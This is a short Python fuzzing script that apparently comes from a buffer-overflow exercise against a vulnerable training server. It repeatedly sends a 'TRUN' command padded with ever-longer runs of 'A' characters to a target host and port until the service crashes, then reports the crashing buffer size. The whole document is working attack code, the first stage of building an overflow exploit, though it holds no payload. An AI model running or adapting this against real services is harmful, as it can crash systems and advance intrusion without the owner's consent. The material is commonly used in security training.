#!/usr/bin/python 
import socket,sys 
from time import sleep 
buffer = "A" * 100 

RHOST = "127.0.0.1" #IP address of the target machine, example: "10.10.10.0" 
RPORT = 31337 #Port number of the target machine, example: 21 

while True: 
     try: 
	
	 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) 
	 s.connect((RHOST,RPORT)) 
	 s.send('TRUN /.:/' + buffer + "\r\n") #replace TRUN with spike result, or remove 'TRUN /.:/' if no commands
	 s.close() 
	 sleep(1) 
	 buffer += "A" * 100 
	
     except: 
	 
	 print("Debugger crashed at %s bytes" % str(len(buffer))) 
	 sys.exit()
